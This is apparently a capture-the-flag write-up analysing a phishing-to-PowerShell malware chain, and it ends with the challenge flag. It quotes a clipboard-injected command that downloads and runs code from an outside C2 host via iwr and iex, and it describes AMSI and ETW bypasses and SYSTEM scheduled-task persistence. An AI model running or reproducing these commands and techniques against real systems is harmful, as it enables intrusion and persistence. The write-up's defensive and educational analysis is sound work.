# Youve got mail!

> 🔴 **Hard** — 1000 pts

## Challenge Description

I um... might have clicked something I shouldn't have... I swear I didn't mean to! I just wanted to see if it was really
the flags being shared - to let Jens know I mean! Anyway, can you help me out?

Disclaimer: The handout file may be flagged as malware by antivirus software. It is recommended to run it in a sandbox
or isolated environment.

[Handout](https://nextcloud.haaukins.com/s/eKtTqT3y5d7bpfH/download)

## Solution (ai copywritten)

This challenge revolves around analyzing a multi-stage malware infection chain that starts with a phishing email and ends with AES-encrypted PowerShell payloads. The goal is to unpack the stages, understand the execution flow, and decrypt the final payload to find the flag.

### Step 1: The Phishing Vector & Clipboard Hijacking

The attack begins with an `.eml` file named `Jens Myrup shared _Challenge writeups DDC2026.pdf_ with you.eml`. Extracting this file reveals an HTML attachment named `SecureMessage.html`.

When opened, the HTML page displays a fake Microsoft Outlook "protected message" alert. It tricks the user into manually executing the malware by instructing them to press `Ctrl + C`, `Windows + R`, `Ctrl + V`, and `Enter`.

Looking at the source code of `SecureMessage.html`, we can see how the trap works. It uses JavaScript to hijack the clipboard via `navigator.clipboard.write`. When the user copies the text, the script silently replaces their clipboard content with a malicious PowerShell command:
`powershell.exe -ExecutionPolicy Bypass -c "iwr -UseBasicParsing jolly-heart-a4be.oluf-sand.workers.dev|iex"`.

### Step 2: Tracking the C2 Traffic

The injected command uses `iwr` (Invoke-WebRequest) to download a payload from the C2 server at `jolly-heart-a4be.oluf-sand.workers.dev`.

The server does some basic filtering. If you navigate to the URL in a browser, it returns a benign-looking dummy payload: `echo "">C:/Windows/Temp/ndr8C2E.tmp`. However, when requested via PowerShell, the server returns a Base64-encoded and GZip-compressed payload that gets executed immediately via `iex` (Invoke-Expression).

### Step 3: Unpacking the Payloads

The execution chain involves multiple requests, each pulling down a new compressed payload. Using the provided `decode_payload.py` script, we can decode the Base64 and decompress the GZip data to retrieve the raw PowerShell scripts.

This gives us four distinct stages:

* **Stage 1 (`req1_decoded.ps1`):** The initial script contains heavily obfuscated variables. It uses .NET reflection (`[Reflection.Assembly]::LoadWithPartialName`) to disable AMSI and Event Tracing for Windows (ETW), preventing the system from logging the malicious activity. It then downloads the next stage from `/update/a3a7a35e-2534-4b46-85f0-d3304c34f48a`.
* **Stage 2 & 3:** These are downloaded and executed dynamically. The logs show they are invoked with specific argument pairs, such as `Invoke-Command ... -ArgumentList @("sour", "precision")` and `@("cottage", "cool")`.
* **Stage 4 (`req4_decoded.ps1`):** This script contains several Base64 strings and an AES decryption function. It takes two arguments (a payload variable and a key variable), extracts a 16-byte Initialization Vector (IV) from the start of the payload, and decrypts the rest using AES-CBC.

### Step 4: Breaking the AES Encryption

To reveal the true behavior of the malware, we can use the `decrypt_payload.py` script. This script brute-forces the AES decryption by treating every 32-byte decoded Base64 string as a potential key and the larger strings as potential payloads.

By running the decryptor against our unpacked scripts, we uncover the entire execution chain:

1. **Stage 2 Decryption:** Using the payload `$sour` and key `$precision`, it decrypts a command that further patches and disables the `PSEtwLogProvider`.
2. **Stage 3 Decryption:** Using the payload `$cottage` and key `$cool`, it decrypts a script that establishes persistence. It registers a Scheduled Task named `ExampleBootTask` that runs at startup as the `SYSTEM` user. This task reaches out to `/update/32aebe97-cb2e-4507-a912-9e53e72b9106` to grab the final payload.
3. **Stage 4 Decryption (The Final Payload):** The raw logs show the final task executes with the arguments `criminal` and `batting`. Running the decryptor on `req4_decoded.ps1` with the payload `$criminal` and key `$batting` successfully unpacks the final layer.

### The Flag

The decrypted output of the fourth payload reveals the hidden flag assigned to the `$secret` variable.

**`DDC{l1v1ng_0ff_th3_l4nd_1s_th3_b3st_f34l1ng_dc9ed4584956}`**
